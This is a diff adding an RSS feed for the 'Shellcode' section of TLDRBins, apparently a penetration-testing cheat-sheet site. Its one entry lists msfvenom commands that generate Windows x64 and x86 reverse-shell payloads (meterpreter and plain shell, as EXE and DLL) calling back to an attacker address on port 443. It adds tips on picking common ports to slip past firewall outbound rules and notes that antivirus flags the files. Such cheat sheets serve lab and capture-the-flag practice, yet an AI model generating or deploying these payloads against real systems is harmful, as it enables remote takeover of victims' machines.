@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Shellcode on TLDRBins</title>
+    <link>https://tldrbins.github.io/@shellcode/</link>
+    <description>Recent content in Shellcode on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@shellcode/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Metasploit Shellcode</title>
+      <link>https://tldrbins.github.io/metasploit_shellcode/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/metasploit_shellcode/</guid>
+      <description>Generate Metasploit Shellcode Windows x64 EXE msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.exe Windows x86 EXE # Staged msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe --platform windows LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.exe # Stageless msfvenom -p windows/shell_reverse_tcp -a x86 -f exe --platform windows LHOST=10.10.14.10 LPORT=443 EXITFUNC=thread &amp;gt; rev.exe Windows x64 DLL msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f dll --platform windows LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.dll Note: These will be flagged by AV Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules</description>
+    </item>
+  </channel>
+</rss>
